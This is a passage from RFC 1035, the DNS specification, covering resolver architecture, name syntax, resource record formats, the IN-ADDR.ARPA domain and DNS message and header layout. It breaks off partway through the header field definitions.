    +---------+ |             +----------+         |  +--------+
    |         | |             |          |responses|  |        |
    |         | |             |   Name   |---------|->|Foreign |
    |  Master |-------------->|  Server  |         |  |Resolver|
    |  files  | |             |          |<--------|--|        |
    |         |/              |          | queries |  +--------+
    +---------+               +----------+         |
                                A     |maintenance |  +--------+
                                |     +------------|->|        |
                                |      queries     |  |Foreign |
                                |                  |  |  Name  |
                                +------------------|--| Server |
                             maintenance responses |  +--------+

The shared database holds domain space data for the local name server
and resolver.  The contents of the shared database will typically be a
mixture of authoritative data maintained by the periodic refresh
operations of the name server and cached data from previous resolver
requests.  The structure of the domain data and the necessity for
synchronization between name servers and resolvers imply the general
characteristics of this database, but the actual format is up to the
local implementor.




Mockapetris                                                     [Page 6]

RFC 1035        Domain Implementation and Specification    November 1987


Information flow can also be tailored so that a group of hosts act
together to optimize activities.  Sometimes this is done to offload less
capable hosts so that they do not have to implement a full resolver.
This can be appropriate for PCs or hosts which want to minimize the
amount of new network code which is required.  This scheme can also
allow a group of hosts can share a small number of caches rather than
maintaining a large number of separate caches, on the premise that the
centralized caches will have a higher hit ratio.  In either case,
resolvers are replaced with stub resolvers which act as front ends to
resolvers located in a recursive server in one or more name servers
known to perform that service:

                   Local Hosts                     |  Foreign
                                                   |
    +---------+                                    |
    |         | responses                          |
    | Stub    |<--------------------+              |
    | Resolver|                     |              |
    |         |----------------+    |              |
    +---------+ recursive      |    |              |
                queries        |    |              |
                               V    |              |
    +---------+ recursive     +----------+         |  +--------+
    |         | queries       |          |queries  |  |        |
    | Stub    |-------------->| Recursive|---------|->|Foreign |
    | Resolver|               | Server   |         |  |  Name  |
    |         |<--------------|          |<--------|--| Server |
    +---------+ responses     |          |responses|  |        |
                              +----------+         |  +--------+
                              |  Central |         |
                              |   cache  |         |
                              +----------+         |

In any case, note that domain components are always replicated for
reliability whenever possible.

10.3.1.2.3. Conventions

The domain system has several conventions dealing with low-level, but
fundamental, issues.  While the implementor is free to violate these
conventions WITHIN HIS OWN SYSTEM, he must observe these conventions in
ALL behavior observed from other hosts.

10.3.1.2.3.1. Preferred name syntax

The DNS specifications attempt to be as general as possible in the rules
for constructing domain names.  The idea is that the name of any
existing object can be expressed as a domain name with minimal changes.



Mockapetris                                                     [Page 7]

RFC 1035        Domain Implementation and Specification    November 1987


However, when assigning a domain name for an object, the prudent user
will select a name which satisfies both the rules of the domain system
and any existing rules for the object, whether these rules are published
or implied by existing programs.

For example, when naming a mail domain, the user should satisfy both the
rules of this memo and those in RFC-822.  When creating a new host name,
the old rules for HOSTS.TXT should be followed.  This avoids problems
when old software is converted to use domain names.

The following syntax will result in fewer problems with many

applications that use domain names (e.g., mail, TELNET).

<domain> ::= <subdomain> | " "

<subdomain> ::= <label> | <subdomain> "." <label>

<label> ::= <letter> [ [ <ldh-str> ] <let-dig> ]

<ldh-str> ::= <let-dig-hyp> | <let-dig-hyp> <ldh-str>

<let-dig-hyp> ::= <let-dig> | "-"

<let-dig> ::= <letter> | <digit>

<letter> ::= any one of the 52 alphabetic characters A through Z in
upper case and a through z in lower case

<digit> ::= any one of the ten digits 0 through 9

Note that while upper and lower case letters are allowed in domain
names, no significance is attached to the case.  That is, two names with
the same spelling but different case are to be treated as if identical.

The labels must follow the rules for ARPANET host names.  They must
start with a letter, end with a letter or digit, and have as interior
characters only letters, digits, and hyphen.  There are also some
restrictions on the length.  Labels must be 63 characters or less.

For example, the following strings identify hosts in the Internet:

A.ISI.EDU XX.LCS.MIT.EDU SRI-NIC.ARPA

10.3.1.2.3.2. Data Transmission Order

The order of transmission of the header and data described in this
document is resolved to the octet level.  Whenever a diagram shows a



Mockapetris                                                     [Page 8]

RFC 1035        Domain Implementation and Specification    November 1987


group of octets, the order of transmission of those octets is the normal
order in which they are read in English.  For example, in the following
diagram, the octets are transmitted in the order they are numbered.

     0                   1
     0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |       1       |       2       |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |       3       |       4       |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |       5       |       6       |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Whenever an octet represents a numeric quantity, the left most bit in
the diagram is the high order or most significant bit.  That is, the bit
labeled 0 is the most significant bit.  For example, the following
diagram represents the value 170 (decimal).

     0 1 2 3 4 5 6 7
    +-+-+-+-+-+-+-+-+
    |1 0 1 0 1 0 1 0|
    +-+-+-+-+-+-+-+-+

Similarly, whenever a multi-octet field represents a numeric quantity
the left most bit of the whole field is the most significant bit.  When
a multi-octet quantity is transmitted the most significant octet is
transmitted first.

10.3.1.2.3.3. Character Case

For all parts of the DNS that are part of the official protocol, all
comparisons between character strings (e.g., labels, domain names, etc.)
are done in a case-insensitive manner.  At present, this rule is in
force throughout the domain system without exception.  However, future
additions beyond current usage may need to use the full binary octet
capabilities in names, so attempts to store domain names in 7-bit ASCII
or use of special bytes to terminate labels, etc., should be avoided.

When data enters the domain system, its original case should be
preserved whenever possible.  In certain circumstances this cannot be
done.  For example, if two RRs are stored in a database, one at x.y and
one at X.Y, they are actually stored at the same place in the database,
and hence only one casing would be preserved.  The basic rule is that
case can be discarded only when data is used to define structure in a
database, and two names are identical when compared in a case
insensitive manner.




Mockapetris                                                     [Page 9]

RFC 1035        Domain Implementation and Specification    November 1987


Loss of case sensitive data must be minimized.  Thus while data for x.y
and X.Y may both be stored under a single location x.y or X.Y, data for
a.x and B.X would never be stored under A.x, A.X, b.x, or b.X.  In
general, this preserves the case of the first label of a domain name,
but forces standardization of interior node labels.

Systems administrators who enter data into the domain database should
take care to represent the data they supply to the domain system in a
case-consistent manner if their system is case-sensitive.  The data
distribution system in the domain system will ensure that consistent
representations are preserved.

10.3.1.2.3.4. Size limits

Various objects and parameters in the DNS have size limits.  They are
listed below.  Some could be easily changed, others are more
fundamental.

labels          63 octets or less

names           255 octets or less

TTL             positive values of a signed 32 bit number.

UDP messages    512 octets or less

10.3.1.3. DOMAIN NAME SPACE AND RR DEFINITIONS

10.3.1.3.1. Name space definitions

Domain names in messages are expressed in terms of a sequence of labels.
Each label is represented as a one octet length field followed by that
number of octets.  Since every domain name ends with the null label of
the root, a domain name is terminated by a length byte of zero.  The
high order two bits of every length octet must be zero, and the
remaining six bits of the length field limit the label to 63 octets or
less.

To simplify implementations, the total length of a domain name (i.e.,
label octets and label length octets) is restricted to 255 octets or
less.

Although labels can contain any 8 bit values in octets that make up a
label, it is strongly recommended that labels follow the preferred
syntax described elsewhere in this memo, which is compatible with
existing host naming conventions.  Name servers and resolvers must
compare labels in a case-insensitive manner (i.e., A=a), assuming ASCII
with zero parity.  Non-alphabetic codes must match exactly.



Mockapetris                                                    [Page 10]

RFC 1035        Domain Implementation and Specification    November 1987


10.3.1.3.2. RR definitions

10.3.1.3.2.1. Format

All RRs have the same top level format shown below:

                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                                               |
    /                                               /
    /                      NAME                     /
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     CLASS                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TTL                      |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                   RDLENGTH                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
    /                     RDATA                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+


where:

NAME            an owner name, i.e., the name of the node to which this
                resource record pertains.

TYPE            two octets containing one of the RR TYPE codes.

CLASS           two octets containing one of the RR CLASS codes.

TTL             a 32 bit signed integer that specifies the time interval
                that the resource record may be cached before the source
                of the information should again be consulted.  Zero
                values are interpreted to mean that the RR can only be
                used for the transaction in progress, and should not be
                cached.  For example, SOA records are always distributed
                with a zero TTL to prohibit caching.  Zero values can
                also be used for extremely volatile data.

RDLENGTH        an unsigned 16 bit integer that specifies the length in
                octets of the RDATA field.



Mockapetris                                                    [Page 11]

RFC 1035        Domain Implementation and Specification    November 1987


RDATA           a variable length string of octets that describes the
                resource.  The format of this information varies
                according to the TYPE and CLASS of the resource record.

10.3.1.3.2.2. TYPE values

TYPE fields are used in resource records.  Note that these types are a
subset of QTYPEs.

TYPE            value and meaning

A               1 a host address

NS              2 an authoritative name server

MD              3 a mail destination (Obsolete - use MX)

MF              4 a mail forwarder (Obsolete - use MX)

CNAME           5 the canonical name for an alias

SOA             6 marks the start of a zone of authority

MB              7 a mailbox domain name (EXPERIMENTAL)

MG              8 a mail group member (EXPERIMENTAL)

MR              9 a mail rename domain name (EXPERIMENTAL)

NULL            10 a null RR (EXPERIMENTAL)

WKS             11 a well known service description

PTR             12 a domain name pointer

HINFO           13 host information

MINFO           14 mailbox or mail list information

MX              15 mail exchange

TXT             16 text strings

10.3.1.3.2.3. QTYPE values

QTYPE fields appear in the question part of a query.  QTYPES are a
superset of TYPEs, hence all TYPEs are valid QTYPEs.  In addition, the
following QTYPEs are defined:



Mockapetris                                                    [Page 12]

RFC 1035        Domain Implementation and Specification    November 1987


AXFR            252 A request for a transfer of an entire zone

MAILB           253 A request for mailbox-related records (MB, MG or MR)

MAILA           254 A request for mail agent RRs (Obsolete - see MX)

*               255 A request for all records

10.3.1.3.2.4. CLASS values

CLASS fields appear in resource records.  The following CLASS mnemonics
and values are defined:

IN              1 the Internet

CS              2 the CSNET class (Obsolete - used only for examples in
                some obsolete RFCs)

CH              3 the CHAOS class

HS              4 Hesiod [Dyer 87]

10.3.1.3.2.5. QCLASS values

QCLASS fields appear in the question section of a query.  QCLASS values
are a superset of CLASS values; every CLASS is a valid QCLASS.  In
addition to CLASS values, the following QCLASSes are defined:

*               255 any class

10.3.1.3.3. Standard RRs

The following RR definitions are expected to occur, at least
potentially, in all classes.  In particular, NS, SOA, CNAME, and PTR
will be used in all classes, and have the same format in all classes.
Because their RDATA format is known, all domain names in the RDATA
section of these RRs may be compressed.

<domain-name> is a domain name represented as a series of labels, and
terminated by a label with zero length.  <character-string> is a single
length octet followed by that number of characters.  <character-string>
is treated as binary information, and can be up to 256 characters in
length (including the length octet).








Mockapetris                                                    [Page 13]

RFC 1035        Domain Implementation and Specification    November 1987


10.3.1.3.3.1. CNAME RDATA format

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                     CNAME                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

CNAME           A <domain-name> which specifies the canonical or primary
                name for the owner.  The owner name is an alias.

CNAME RRs cause no additional section processing, but name servers may
choose to restart the query at the canonical name in certain cases.  See
the description of name server logic in [RFC-1034] for details.

10.3.1.3.3.2. HINFO RDATA format

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                      CPU                      /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                       OS                      /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

CPU             A <character-string> which specifies the CPU type.

OS              A <character-string> which specifies the operating
                system type.

Standard values for CPU and OS can be found in [RFC-1010].

HINFO records are used to acquire general information about a host.  The
main use is for protocols such as FTP that can use special procedures
when talking between machines or operating systems of the same type.

10.3.1.3.3.3. MB RDATA format (EXPERIMENTAL)

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                   MADNAME                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

MADNAME         A <domain-name> which specifies a host which has the
                specified mailbox.



Mockapetris                                                    [Page 14]

RFC 1035        Domain Implementation and Specification    November 1987


MB records cause additional section processing which looks up an A type
RRs corresponding to MADNAME.

10.3.1.3.3.4. MD RDATA format (Obsolete)

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                   MADNAME                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

MADNAME         A <domain-name> which specifies a host which has a mail
                agent for the domain which should be able to deliver
                mail for the domain.

MD records cause additional section processing which looks up an A type
record corresponding to MADNAME.

MD is obsolete.  See the definition of MX and [RFC-974] for details of
the new scheme.  The recommended policy for dealing with MD RRs found in
a master file is to reject them, or to convert them to MX RRs with a
preference of 0.

10.3.1.3.3.5. MF RDATA format (Obsolete)

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                   MADNAME                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

MADNAME         A <domain-name> which specifies a host which has a mail
                agent for the domain which will accept mail for
                forwarding to the domain.

MF records cause additional section processing which looks up an A type
record corresponding to MADNAME.

MF is obsolete.  See the definition of MX and [RFC-974] for details ofw
the new scheme.  The recommended policy for dealing with MD RRs found in
a master file is to reject them, or to convert them to MX RRs with a
preference of 10.







Mockapetris                                                    [Page 15]

RFC 1035        Domain Implementation and Specification    November 1987


10.3.1.3.3.6. MG RDATA format (EXPERIMENTAL)

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                   MGMNAME                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

MGMNAME         A <domain-name> which specifies a mailbox which is a
                member of the mail group specified by the domain name.

MG records cause no additional section processing.

10.3.1.3.3.7. MINFO RDATA format (EXPERIMENTAL)

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                    RMAILBX                    /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                    EMAILBX                    /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

RMAILBX         A <domain-name> which specifies a mailbox which is
                responsible for the mailing list or mailbox.  If this
                domain name names the root, the owner of the MINFO RR is
                responsible for itself.  Note that many existing mailing
                lists use a mailbox X-request for the RMAILBX field of
                mailing list X, e.g., Msgroup-request for Msgroup.  This
                field provides a more general mechanism.


EMAILBX         A <domain-name> which specifies a mailbox which is to
                receive error messages related to the mailing list or
                mailbox specified by the owner of the MINFO RR (similar
                to the ERRORS-TO: field which has been proposed).  If
                this domain name names the root, errors should be
                returned to the sender of the message.

MINFO records cause no additional section processing.  Although these
records can be associated with a simple mailbox, they are usually used
with a mailing list.








Mockapetris                                                    [Page 16]

RFC 1035        Domain Implementation and Specification    November 1987


10.3.1.3.3.8. MR RDATA format (EXPERIMENTAL)

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                   NEWNAME                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

NEWNAME         A <domain-name> which specifies a mailbox which is the
                proper rename of the specified mailbox.

MR records cause no additional section processing.  The main use for MR
is as a forwarding entry for a user who has moved to a different
mailbox.

10.3.1.3.3.9. MX RDATA format

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                  PREFERENCE                   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                   EXCHANGE                    /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

PREFERENCE      A 16 bit integer which specifies the preference given to
                this RR among others at the same owner.  Lower values
                are preferred.

EXCHANGE        A <domain-name> which specifies a host willing to act as
                a mail exchange for the owner name.

MX records cause type A additional section processing for the host
specified by EXCHANGE.  The use of MX RRs is explained in detail in
[RFC-974].

10.3.1.3.3.10. NULL RDATA format (EXPERIMENTAL)

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                  <anything>                   /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

Anything at all may be in the RDATA field so long as it is 65535 octets
or less.




Mockapetris                                                    [Page 17]

RFC 1035        Domain Implementation and Specification    November 1987


NULL records cause no additional section processing.  NULL RRs are not
allowed in master files.  NULLs are used as placeholders in some
experimental extensions of the DNS.

10.3.1.3.3.11. NS RDATA format

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                   NSDNAME                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

NSDNAME         A <domain-name> which specifies a host which should be
                authoritative for the specified class and domain.

NS records cause both the usual additional section processing to locate
a type A record, and, when used in a referral, a special search of the
zone in which they reside for glue information.

The NS RR states that the named host should be expected to have a zone
starting at owner name of the specified class.  Note that the class may
not indicate the protocol family which should be used to communicate
with the host, although it is typically a strong hint.  For example,
hosts which are name servers for either Internet (IN) or Hesiod (HS)
class information are normally queried using IN class protocols.

10.3.1.3.3.12. PTR RDATA format

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                   PTRDNAME                    /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

PTRDNAME        A <domain-name> which points to some location in the
                domain name space.

PTR records cause no additional section processing.  These RRs are used
in special domains to point to some other location in the domain space.
These records are simple data, and don't imply any special processing
similar to that performed by CNAME, which identifies aliases.  See the
description of the IN-ADDR.ARPA domain for an example.








Mockapetris                                                    [Page 18]

RFC 1035        Domain Implementation and Specification    November 1987


10.3.1.3.3.13. SOA RDATA format

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                     MNAME                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                     RNAME                     /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    SERIAL                     |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    REFRESH                    |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     RETRY                     |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    EXPIRE                     |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    MINIMUM                    |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

MNAME           The <domain-name> of the name server that was the
                original or primary source of data for this zone.

RNAME           A <domain-name> which specifies the mailbox of the
                person responsible for this zone.

SERIAL          The unsigned 32 bit version number of the original copy
                of the zone.  Zone transfers preserve this value.  This
                value wraps and should be compared using sequence space
                arithmetic.

REFRESH         A 32 bit time interval before the zone should be
                refreshed.

RETRY           A 32 bit time interval that should elapse before a
                failed refresh should be retried.

EXPIRE          A 32 bit time value that specifies the upper limit on
                the time interval that can elapse before the zone is no
                longer authoritative.





Mockapetris                                                    [Page 19]

RFC 1035        Domain Implementation and Specification    November 1987


MINIMUM         The unsigned 32 bit minimum TTL field that should be
                exported with any RR from this zone.

SOA records cause no additional section processing.

All times are in units of seconds.

Most of these fields are pertinent only for name server maintenance
operations.  However, MINIMUM is used in all query operations that
retrieve RRs from a zone.  Whenever a RR is sent in a response to a
query, the TTL field is set to the maximum of the TTL field from the RR
and the MINIMUM field in the appropriate SOA.  Thus MINIMUM is a lower
bound on the TTL field for all RRs in a zone.  Note that this use of
MINIMUM should occur when the RRs are copied into the response and not
when the zone is loaded from a master file or via a zone transfer.  The
reason for this provison is to allow future dynamic update facilities to
change the SOA RR with known semantics.


10.3.1.3.3.14. TXT RDATA format

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    /                   TXT-DATA                    /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

TXT-DATA        One or more <character-string>s.

TXT RRs are used to hold descriptive text.  The semantics of the text
depends on the domain where it is found.

10.3.1.3.4. Internet specific RRs

10.3.1.3.4.1. A RDATA format

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ADDRESS                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

ADDRESS         A 32 bit Internet address.

Hosts that have multiple Internet addresses will have multiple A
records.





Mockapetris                                                    [Page 20]

RFC 1035        Domain Implementation and Specification    November 1987


A records cause no additional section processing.  The RDATA section of
an A line in a master file is an Internet address expressed as four
decimal numbers separated by dots without any imbedded spaces (e.g.,
"10.2.0.52" or "192.0.5.6").

10.3.1.3.4.2. WKS RDATA format

    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ADDRESS                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |       PROTOCOL        |                       |
    +--+--+--+--+--+--+--+--+                       |
    |                                               |
    /                   <BIT MAP>                   /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

ADDRESS         An 32 bit Internet address

PROTOCOL        An 8 bit IP protocol number

<BIT MAP>       A variable length bit map.  The bit map must be a
                multiple of 8 bits long.

The WKS record is used to describe the well known services supported by
a particular protocol on a particular internet address.  The PROTOCOL
field specifies an IP protocol number, and the bit map has one bit per
port of the specified protocol.  The first bit corresponds to port 0,
the second to port 1, etc.  If the bit map does not include a bit for a
protocol of interest, that bit is assumed zero.  The appropriate values
and mnemonics for ports and protocols are specified in [RFC-1010].

For example, if PROTOCOL=TCP (6), the 26th bit corresponds to TCP port
25 (SMTP).  If this bit is set, a SMTP server should be listening on TCP
port 25; if zero, SMTP service is not supported on the specified
address.

The purpose of WKS RRs is to provide availability information for
servers for TCP and UDP.  If a server supports both TCP and UDP, or has
multiple Internet addresses, then multiple WKS RRs are used.

WKS RRs cause no additional section processing.

In master files, both ports and protocols are expressed using mnemonics
or decimal numbers.




Mockapetris                                                    [Page 21]

RFC 1035        Domain Implementation and Specification    November 1987


10.3.1.3.5. IN-ADDR.ARPA domain

The Internet uses a special domain to support gateway location and
Internet address to host mapping.  Other classes may employ a similar
strategy in other domains.  The intent of this domain is to provide a
guaranteed method to perform host address to host name mapping, and to
facilitate queries to locate all gateways on a particular network in the
Internet.

Note that both of these services are similar to functions that could be
performed by inverse queries; the difference is that this part of the
domain name space is structured according to address, and hence can
guarantee that the appropriate data can be located without an exhaustive
search of the domain space.

The domain begins at IN-ADDR.ARPA and has a substructure which follows
the Internet addressing structure.

Domain names in the IN-ADDR.ARPA domain are defined to have up to four
labels in addition to the IN-ADDR.ARPA suffix.  Each label represents
one octet of an Internet address, and is expressed as a character string
for a decimal value in the range 0-255 (with leading zeros omitted
except in the case of a zero octet which is represented by a single
zero).

Host addresses are represented by domain names that have all four labels
specified.  Thus data for Internet address 10.2.0.52 is located at
domain name 52.0.2.10.IN-ADDR.ARPA.  The reversal, though awkward to
read, allows zones to be delegated which are exactly one network of
address space.  For example, 10.IN-ADDR.ARPA can be a zone containing
data for the ARPANET, while 26.IN-ADDR.ARPA can be a separate zone for
MILNET.  Address nodes are used to hold pointers to primary host names
in the normal domain space.

Network numbers correspond to some non-terminal nodes at various depths
in the IN-ADDR.ARPA domain, since Internet network numbers are either 1,
2, or 3 octets.  Network nodes are used to hold pointers to the primary
host names of gateways attached to that network.  Since a gateway is, by
definition, on more than one network, it will typically have two or more
network nodes which point at it.  Gateways will also have host level
pointers at their fully qualified addresses.

Both the gateway pointers at network nodes and the normal host pointers
at full address nodes use the PTR RR to point back to the primary domain
names of the corresponding hosts.

For example, the IN-ADDR.ARPA domain will contain information about the
ISI gateway between net 10 and 26, an MIT gateway from net 10 to MIT's



Mockapetris                                                    [Page 22]

RFC 1035        Domain Implementation and Specification    November 1987


net 18, and hosts A.ISI.EDU and MULTICS.MIT.EDU.  Assuming that ISI
gateway has addresses 10.2.0.22 and 26.0.0.103, and a name MILNET-
GW.ISI.EDU, and the MIT gateway has addresses 10.0.0.77 and 18.10.0.4
and a name GW.LCS.MIT.EDU, the domain database would contain:

|    10.IN-ADDR.ARPA.           PTR MILNET-GW.ISI.EDU.
|    10.IN-ADDR.ARPA.           PTR GW.LCS.MIT.EDU.
|    18.IN-ADDR.ARPA.           PTR GW.LCS.MIT.EDU.
|    26.IN-ADDR.ARPA.           PTR MILNET-GW.ISI.EDU.
|    22.0.2.10.IN-ADDR.ARPA.    PTR MILNET-GW.ISI.EDU.
|    103.0.0.26.IN-ADDR.ARPA.   PTR MILNET-GW.ISI.EDU.
|    77.0.0.10.IN-ADDR.ARPA.    PTR GW.LCS.MIT.EDU.
|    4.0.10.18.IN-ADDR.ARPA.    PTR GW.LCS.MIT.EDU.
|    103.0.3.26.IN-ADDR.ARPA.   PTR A.ISI.EDU.
|    6.0.0.10.IN-ADDR.ARPA.     PTR MULTICS.MIT.EDU.
|
Thus a program which wanted to locate gateways on net 10 would originate
a query of the form QTYPE=PTR, QCLASS=IN, QNAME=10.IN-ADDR.ARPA.  It
would receive two RRs in response:

    10.IN-ADDR.ARPA.           PTR MILNET-GW.ISI.EDU.
    10.IN-ADDR.ARPA.           PTR GW.LCS.MIT.EDU.

The program could then originate QTYPE=A, QCLASS=IN queries for MILNET-
GW.ISI.EDU. and GW.LCS.MIT.EDU. to discover the Internet addresses of
these gateways.

A resolver which wanted to find the host name corresponding to Internet
host address 10.0.0.6 would pursue a query of the form QTYPE=PTR,
QCLASS=IN, QNAME=6.0.0.10.IN-ADDR.ARPA, and would receive:

    6.0.0.10.IN-ADDR.ARPA.     PTR MULTICS.MIT.EDU.

Several cautions apply to the use of these services:
   - Since the IN-ADDR.ARPA special domain and the normal domain
     for a particular host or gateway will be in different zones,
     the possibility exists that that the data may be inconsistent.

   - Gateways will often have two names in separate domains, only
     one of which can be primary.

   - Systems that use the domain database to initialize their
     routing tables must start with enough gateway information to
     guarantee that they can access the appropriate name server.

   - The gateway data only reflects the existence of a gateway in a
     manner equivalent to the current HOSTS.TXT file.  It doesn't
     replace the dynamic availability information from GGP or EGP.



Mockapetris                                                    [Page 23]

RFC 1035        Domain Implementation and Specification    November 1987


10.3.1.3.6. Defining new types, classes, and special namespaces

The previously defined types and classes are the ones in use as of the
date of this memo.  New definitions should be expected.  This section
makes some recommendations to designers considering additions to the
existing facilities.  The mailing list NAMEDROPPERS@SRI-NIC.ARPA is the
forum where general discussion of design issues takes place.

In general, a new type is appropriate when new information is to be
added to the database about an existing object, or we need new data
formats for some totally new object.  Designers should attempt to define
types and their RDATA formats that are generally applicable to all
classes, and which avoid duplication of information.  New classes are
appropriate when the DNS is to be used for a new protocol, etc which
requires new class-specific data formats, or when a copy of the existing
name space is desired, but a separate management domain is necessary.

New types and classes need mnemonics for master files; the format of the
master files requires that the mnemonics for type and class be disjoint.

TYPE and CLASS values must be a proper subset of QTYPEs and QCLASSes
respectively.

The present system uses multiple RRs to represent multiple values of a
type rather than storing multiple values in the RDATA section of a
single RR.  This is less efficient for most applications, but does keep
RRs shorter.  The multiple RRs assumption is incorporated in some
experimental work on dynamic update methods.

The present system attempts to minimize the duplication of data in the
database in order to insure consistency.  Thus, in order to find the
address of the host for a mail exchange, you map the mail domain name to
a host name, then the host name to addresses, rather than a direct
mapping to host address.  This approach is preferred because it avoids
the opportunity for inconsistency.

In defining a new type of data, multiple RR types should not be used to
create an ordering between entries or express different formats for
equivalent bindings, instead this information should be carried in the
body of the RR and a single type used.  This policy avoids problems with
caching multiple types and defining QTYPEs to match multiple types.

For example, the original form of mail exchange binding used two RR
types one to represent a "closer" exchange (MD) and one to represent a
"less close" exchange (MF).  The difficulty is that the presence of one
RR type in a cache doesn't convey any information about the other
because the query which acquired the cached information might have used
a QTYPE of MF, MD, or MAILA (which matched both).  The redesigned



Mockapetris                                                    [Page 24]

RFC 1035        Domain Implementation and Specification    November 1987


service used a single type (MX) with a "preference" value in the RDATA
section which can order different RRs.  However, if any MX RRs are found
in the cache, then all should be there.

10.3.1.4. MESSAGES

10.3.1.4.1. Format

All communications inside of the domain protocol are carried in a single
format called a message.  The top level format of message is divided
into 5 sections (some of which are empty in certain cases) shown below:

    +---------------------+
    |        Header       |
    +---------------------+
    |       Question      | the question for the name server
    +---------------------+
    |        Answer       | RRs answering the question
    +---------------------+
    |      Authority      | RRs pointing toward an authority
    +---------------------+
    |      Additional     | RRs holding additional information
    +---------------------+

The header section is always present.  The header includes fields that
specify which of the remaining sections are present, and also specify
whether the message is a query or a response, a standard query or some
other opcode, etc.

The names of the sections after the header are derived from their use in
standard queries.  The question section contains fields that describe a
question to a name server.  These fields are a query type (QTYPE), a
query class (QCLASS), and a query domain name (QNAME).  The last three
sections have the same format: a possibly empty list of concatenated
resource records (RRs).  The answer section contains RRs that answer the
question; the authority section contains RRs that point toward an
authoritative name server; the additional records section contains RRs
which relate to the query, but are not strictly answers for the
question.












Mockapetris                                                    [Page 25]

RFC 1035        Domain Implementation and Specification    November 1987


10.3.1.4.1.1. Header section format

The header contains the following fields:

                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      ID                       |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QDCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ANCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    NSCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ARCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+

where:

ID              A 16 bit identifier assigned by the program that
                generates any kind of query.  This identifier is copied
                the corresponding reply and can be used by the requester
                to match up replies to outstanding queries.

QR              A one bit field that specifies whether this message is a
                query (0), or a response (1).

OPCODE          A four bit field that specifies kind of query in this
                message.  This value is set by the originator of a query
